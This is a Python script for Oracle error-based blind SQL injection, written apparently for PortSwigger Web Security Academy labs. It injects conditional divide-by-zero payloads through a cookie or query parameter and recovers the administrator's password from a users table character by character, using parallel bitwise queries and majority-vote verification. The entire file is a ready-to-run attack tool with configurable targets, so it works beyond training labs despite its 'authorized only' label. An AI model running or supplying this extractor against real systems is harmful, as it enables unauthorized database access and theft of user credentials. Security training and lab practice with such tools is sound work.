#!/usr/bin/env python3
"""
Oracle error-based blind SQL injection password extractor
(PortSwigger Web Security Academy labs).

Default payload (concat style, cookie/string-context injection):
  xyz'||(SELECT CASE WHEN (COND) THEN TO_CHAR(1/0) ELSE '' END
        FROM users WHERE username='administrator')||'

Alternative (--style and):
  xyz' AND (SELECT CASE WHEN (COND) THEN TO_CHAR(1/0) ELSE NULL END
        FROM users WHERE username='administrator') IS NULL --

Signaling: condition TRUE -> TO_CHAR(1/0) -> ORA-01476 / HTTP 500.
           condition FALSE -> '' (NULL) -> normal response.

Speed: each character is recovered via 7 parallel bitwise queries
(BITAND over the ASCII code) plus a parallel verification pass.

AUTHORIZED TESTING / TRAINING LABS ONLY.
"""

import argparse
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote

import requests

BITS = [1, 2, 4, 8, 16, 32, 64]


def parse_args():
    p = argparse.ArgumentParser(
        description="Oracle error-based blind SQLi password extractor "
                    "(authorized use only)"
    )
    p.add_argument("url", help="Target URL, e.g. https://lab.web-security-academy.net/")
    point = p.add_mutually_exclusive_group(required=True)
    point.add_argument("--cookie", help="Cookie name to inject into (e.g. TrackingId)")
    point.add_argument("--param", help="Query parameter to inject into")
    p.add_argument("--table", default="users")
    p.add_argument("--column", default="password")
    p.add_argument("--user-col", default="username")
    p.add_argument("--username", default="administrator")
    p.add_argument(
        "--style",
        choices=["concat", "and"],
        default="concat",
        help="concat: || string-context (default) | and: AND ... IS NULL --",
    )
    p.add_argument(
        "--error-string",
        default="ORA-01476",
        help="Response substring proving the error fired (empty = status only)",
    )
    p.add_argument(
        "--raw-cookie",
        action="store_true",
        help="Do not URL-encode the payload when injecting via cookie",
    )
    p.add_argument(
        "--workers",
        type=int,
        default=8,
        help="Parallel requests (default 8)",
    )
    p.add_argument("--debug", action="store_true", help="Verbose request logging")
    p.add_argument("--max-length", type=int, default=64)
    p.add_argument(
        "--delay",
        type=float,
        default=0.0,
        help="Per-request delay inside each worker (default 0)",
    )
    p.add_argument("--timeout", type=float, default=10.0)
    p.add_argument("--retries", type=int, default=3)
    return p.parse_args()


class OracleErrorBrute:
    def __init__(self, args):
        self.args = args
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_maxsize=args.workers + 2)
        self.session.mount("https://", adapter)
        self.session.mount("http://", adapter)
        self.pool = ThreadPoolExecutor(max_workers=args.workers)
        self.requests_sent = 0
        self.lock = threading.Lock()
        self.last_resp = None

    def build_payload(self, condition: str) -> str:
        if self.args.style == "and":
            return (
                f"xyz' AND (SELECT CASE WHEN ({condition}) THEN TO_CHAR(1/0) ELSE NULL END "
                f"FROM {self.args.table} WHERE {self.args.user_col}='{self.args.username}') "
                f"IS NULL --"
            )
        return (
            f"xyz'||(SELECT CASE WHEN ({condition}) THEN TO_CHAR(1/0) ELSE '' END "
            f"FROM {self.args.table} WHERE {self.args.user_col}='{self.args.username}')||'"
        )

    def _send(self, payload: str) -> requests.Response:
        if self.args.cookie:
            value = payload if self.args.raw_cookie else quote(payload, safe="")
            return self.session.get(
                self.args.url,
                cookies={self.args.cookie: value},
                timeout=self.args.timeout,
            )
        return self.session.get(
            self.args.url,
            params={self.args.param: payload},
            timeout=self.args.timeout,
        )

    def ask(self, condition: str) -> bool:
        payload = self.build_payload(condition)
        resp = None
        for attempt in range(self.args.retries):
            try:
                resp = self._send(payload)
                with self.lock:
                    self.requests_sent += 1
                if resp.status_code in (200, 500):
                    break
                time.sleep(1.0 * (attempt + 1))
            except requests.RequestException:
                if attempt == self.args.retries - 1:
                    raise
                time.sleep(1.0 * (attempt + 1))
        if self.args.delay:
            time.sleep(self.args.delay)
        self.last_resp = resp
        errored = resp.status_code >= 500 or (
            self.args.error_string and self.args.error_string in resp.text
        )
        if self.args.debug:
            state = "ERROR(true)" if errored else "ok(false)"
            print(
                f"[D] {state} status={resp.status_code} len={len(resp.text)} "
                f"cond={condition!r}"
            )
        return errored

    def ask_majority(self, condition: str, votes: int = 3) -> bool:
        results = list(self.pool.map(lambda _: self.ask(condition), range(votes)))
        return sum(results) > votes // 2

    def healthy(self) -> bool:
        return self.ask("1=1") and not self.ask("1=2")

    def wait_until_healthy(self) -> bool:
        for _ in range(3):
            if self.healthy():
                return True
            print("[!] Canary check failed (server noisy/throttling) - waiting 3s ...")
            time.sleep(3)
        return False

    def length(self) -> int:
        col = self.args.column
        for _ in range(self.args.retries):
            # smallest n for which LENGTH > n is false -> n is the length
            lo, hi = 0, self.args.max_length
            while lo < hi:
                mid = (lo + hi) // 2
                if self.ask(f"LENGTH({col}) > {mid}"):
                    lo = mid + 1
                else:
                    hi = mid
            if lo == 0:
                return 0
            if self.ask_majority(f"LENGTH({col}) = {lo}"):
                return lo
            print("[!] Length verification inconsistent - redoing search ...")
        return lo

    def bit_condition(self, pos: int, bit: int) -> str:
        col = self.args.column
        return f"BITAND(ASCII(SUBSTR({col},{pos},1)),{bit}) > 0"

    def char_condition(self, pos: int, op: str, code: int) -> str:
        col = self.args.column
        return f"ASCII(SUBSTR({col},{pos},1)) {op} {code}"

    def extract_parallel(self, positions) -> dict:
        codes = {pos: 0 for pos in positions}
        futures = {}
        for pos in positions:
            for bit in BITS:
                fut = self.pool.submit(self.ask, self.bit_condition(pos, bit))
                futures[fut] = (pos, bit)
        for fut in as_completed(futures):
            pos, bit = futures[fut]
            if fut.result():
                codes[pos] |= bit
        return codes

    def verify_positions(self, codes: dict) -> set:
        futures = {
            self.pool.submit(self.ask, self.char_condition(pos, "=", code)): pos
            for pos, code in codes.items()
        }
        return {futures[f] for f in as_completed(futures) if not f.result()}

    def char_at_sequential(self, pos: int) -> str:
        for _ in range(self.args.retries):
            lo, hi = 32, 126
            while lo < hi:
                mid = (lo + hi) // 2
                if self.ask(self.char_condition(pos, ">", mid)):
                    lo = mid + 1
                else:
                    hi = mid
            if self.ask(self.char_condition(pos, "=", lo)):
                return chr(lo)
            print(f"[!] Position {pos}: inconsistent, retrying sequentially ...")
            if not self.wait_until_healthy():
                break
        return "?"

    def fix_positions(self, codes: dict) -> None:
        bad = self.verify_positions(codes)
        for pos in sorted(bad):
            print(f"[!] Position {pos}: parallel result unverified - re-extracting ...")
            ch = self.char_at_sequential(pos)
            if ch != "?":
                codes[pos] = ord(ch)

    def extract_fixed(self, count: int) -> dict:
        codes = self.extract_parallel(range(1, count + 1))
        self.fix_positions(codes)
        return codes

    def verify_full(self, extracted: str) -> bool:
        # strict 4-of-5: a plain majority can false-pass on a noisy oracle
        cond = f"{self.args.column} = '{extracted}'"
        results = list(self.pool.map(lambda _: self.ask(cond), range(5)))
        return sum(results) >= 4


def self_test(brute: OracleErrorBrute) -> bool:
    print("[*] Self-test: TRUE (1=1) must error, FALSE (1=2) must not ...")
    if brute.healthy():
        print("[+] Self-test passed: boolean signaling works")
        return True
    print("[-] Self-test FAILED")
    resp = brute.last_resp
    body = resp.text if resp is not None else ""
    print(f"[-] Last response: status={resp.status_code} len={len(body)}")
    m = re.search(r"(?i).{0,60}(ora-\d+|error|exception|divisor).{0,140}", body)
    if m:
        print(f"[-] Error-looking snippet: {m.group(0).strip()!r}")
        print("[-] If that shows the real error text, rerun with --error-string '<text>'")
    print("[-] Also try: --style and | --raw-cookie | verify payload in Burp")
    return False


def main():
    args = parse_args()
    brute = OracleErrorBrute(args)
    injection = f"cookie '{args.cookie}'" if args.cookie else f"param '{args.param}'"
    print(f"[*] Target   : {args.url}")
    print(f"[*] Injecting: {injection} (style: {args.style}, workers: {args.workers})")
    print(f"[*] Extract  : {args.username}.{args.column} FROM {args.table}")
    start = time.time()

    if not self_test(brute):
        sys.exit(1)

    try:
        print("[*] Finding password length ...")
        count = brute.length()
        if count == 0:
            print("[-] Length 0: row/column not found or conditions always false")
            sys.exit(1)
        print(f"[+] Password length: {count}")

        print(f"[*] Extracting {count} chars via parallel bitwise queries ...")
        codes = brute.extract_fixed(count)
        extracted = "".join(chr(codes[p]) for p in sorted(codes))
        print(f"[*] Progress: {extracted}")

        while count < args.max_length and brute.ask_majority(
            f"LENGTH({args.column}) > {count}", 3
        ):
            count += 1
            print(f"[!] Password longer than expected - adding position {count}")
            new = brute.extract_parallel([count])
            brute.fix_positions(new)
            codes.update(new)
            extracted = "".join(chr(codes[p]) for p in sorted(codes))
            print(f"[*] Progress: {extracted}")

        print(f"[*] Final verification: {args.column} = '<extracted>' (5 votes) ...")
        verified = False
        for _ in range(3):
            if brute.verify_full(extracted):
                verified = True
                break
            print("[!] Full-string verification FAILED - re-checking positions ...")
            fixed_any = False
            for pos in sorted(codes):
                if not brute.ask_majority(brute.char_condition(pos, "=", codes[pos])):
                    print(f"[!]   position {pos}: {chr(codes[pos])!r} is wrong")
                    ch = brute.char_at_sequential(pos)
                    if ch != "?":
                        codes[pos] = ord(ch)
                        fixed_any = True
            if brute.ask_majority(f"LENGTH({args.column}) > {len(extracted)}"):
                print(f"[!]   password is longer than {len(extracted)} chars!")
            if not fixed_any:
                break
            extracted = "".join(chr(codes[p]) for p in sorted(codes))
            print(f"[*] Progress: {extracted}")
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(130)
    finally:
        brute.pool.shutdown(wait=False)

    elapsed = time.time() - start
    if verified:
        print(f"\n[+] Verified: string matches the stored value exactly")
    else:
        print(f"\n[!] UNVERIFIED: result may be wrong - do not rely on it")
    print(f"[+] Password (repr): {extracted!r} ({len(extracted)} chars)")
    print(f"[+] Requests: {brute.requests_sent} in {elapsed:.1f}s")
    if not verified:
        sys.exit(1)


if __name__ == "__main__":
    main()
